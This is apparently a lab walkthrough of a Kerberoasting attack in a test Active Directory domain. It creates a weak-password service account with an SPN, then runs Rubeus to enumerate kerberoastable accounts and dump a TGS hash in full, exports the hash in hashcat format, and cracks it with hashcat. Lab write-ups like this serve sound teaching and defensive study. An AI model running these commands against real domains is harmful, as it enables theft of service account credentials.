# Kerberoasting

During this attack, an adversary attempts to enumerate the Service Principal Name \(SPNs\) of service accounts through crafted LDAP queries

## Generate vulnerability

Create OU for service accounts

![image](https://user-images.githubusercontent.com/13157446/129405912-68180d26-1ab2-447f-9e59-4d8f123ffec9.png)

Create service account

```text
#requires -module ActiveDirectory

$destou="OU=Service Accounts,DC=valhalla,DC=local"

$psw = convertto-securestring "Pass123!" -asplaintext -force
New-ADUser -Path $destou -Name "kerberoastme"  -AccountPassword $psw -Enabled $true -AllowReversiblePasswordEncryption $false -CannotChangePassword $true -PasswordNeverExpires $true
```

Set SPN for service account

![Pasted image 20210813214029](https://user-images.githubusercontent.com/13157446/129405121-db8df286-38e3-4d16-a601-3bde3cf1da20.png)

## Exploitation

Enum SPN users with Rubeus

```text
PS C:\Users\thor\Desktop> .\Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : kerberoastme
[*] DistinguishedName      : CN=kerberoastme,OU=Service Accounts,DC=valhalla,DC=local
[*] ServicePrincipalName   : http/kerberoastme:80
[*] PwdLastSet             : 13.08.2021 18:25:06
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*kerberoastme$valhalla.local$http/kerberoastme:80*$B186F27C57F71BA5F
                             241C8F4CEC3403D$A9F7BD89F86353311FAC0F723D490CEE6D045ABA26D43922AFF80BA6407219F8
                             AD5922E6C0681F3DCF8744B43C194CD52963C7667821068581058CFC7D98FD270E7BC5675E737B09
                             F35D9E646CECE872EC5731B272456C74BD6A8F15EF7F01ED90731CEF75C65B58C299CFC740F528B2
                             6B4CD0FB19929C81B474B0C4805D68680EA4E7C6B52433A16A8FFF72B7057D9E5BCC08931CD6E993
                             ACC28E2AEA5222EDDF3FAB46409D0D4348256F5D2C5E5EBACCE9A9DE1F4C1A498DA6F7A03BE83953
                             0109356BA479577185777F62A01803CC8F2FC9656FAF8AC6E0A2500F0CB5D539C2ABD4CD1A978B1A
                             777C840AA2B29DE5E10BC17F5DA3A343D639C13705359E91D2CE0D3F027784BDBDE049F119FC944C
                             975EE01CA80957640C985B13A99C0B8D425282EAD9F1EFB5714058664FFA83303F3B507089A27FA8
                             43540B17C72D9ED051E93C1301BA4CFF6BDA4B2B94FE2E96C878938F11DB6DF7769B561FB0299B8A
                             38412DA88AB43EC49227AFC39D59440C7524EFE7E8BB2B32F0C166922F2FF11132BB6F29CEE0A6B8
                             72BD55C119BAC3A620D0D13223ABCAC2ABAFB19B1599524293DADAC156337C34DB0E6AF072F90143
                             7FFA78BD944905947852F551AED626FD3617E50F6DB90E0442A5E9C5696E0B5FCCF40122ED22D344
                             997C7A928B19679CDB86D150CC840CA763F587359822B7C31138BEFA2C97CBFF4DA29C577F7685FD
                             86C277B12902E8EB36228AB75F331A952D98AFDD6573CD97EFF8C5C786B2C1B6A5B767873273F1D7
                             231E785CE95CC92E2985707124FA18EE4D0FA80CBB82A843BFD6B7B8948210C2482CA4FB7DE7ABD9
                             BBFB42BA5779AFDFA9480DBC36171243ABA03D08FA541BE39937B13ABF68BF81CC4B658FF928FDD7
                             D7C4465D6661D1D87EC1924796D4A3B9EC26CABD5EBA1E4034C3B9D7A6CEB956D07DE65F5DC6AC66
                             A83C355F8E3863A13E616F6CC26CA915850A071209987AC640F429499CC57C3E7B3F750434BE8B2D
                             30BB264733415B5008EF4B3342A6F8F395698932D07181B7A6CCBEA5735E034B2C6C6A21C3B17991
                             58AD4C0F012B2AA3FFA99E7BC13F738FCF79877DEC4425D79C755EC7D1C20061A47D9DD61A02D40D
                             10A13F2DC862DE99DAB8530C3839BDA09E3F9A49887E51E2A1C1A98A0294C200F472D95E79B7824B
                             200A6342961613E1B2B986916DF92C0CEA020CDC6CB495DF08BE5B505821D537F1105CD23B359040
                             88967AC0301801A6F3B3703BDB007DF6042798D806D2CA97639BFDD4383F835B946049ABA764BD8F
                             54FC2C5C500EE9D5E2720024A9AC1FE76D022F0A19073476F5E067FF167A179B4B5EC285217D09ED
                             F08E16DECB81A15F8CC3AE2D98FF9BAFEA3191A5912E9022799EAF418BEE9E997DFB66F5D06EB92A
                             B4BDC1BBBA491E3A9BCD594692ACCE4959701051D2B1770689817B4497
```

Save hashcat format

```text
PS C:\Users\thor\Desktop> .\Rubeus.exe kerberoast /outfile:hash.txt /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : kerberoastme
[*] DistinguishedName      : CN=kerberoastme,OU=Service Accounts,DC=valhalla,DC=local
[*] ServicePrincipalName   : http/kerberoastme:80
[*] PwdLastSet             : 13.08.2021 18:25:06
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\thor\Desktop\hash.txt

[*] Roasted hashes written to : C:\Users\thor\Desktop\hash.txt
```

Crack with hashcat

```text
hashcat -m 13100 hash.txt 500.txt --force 
```

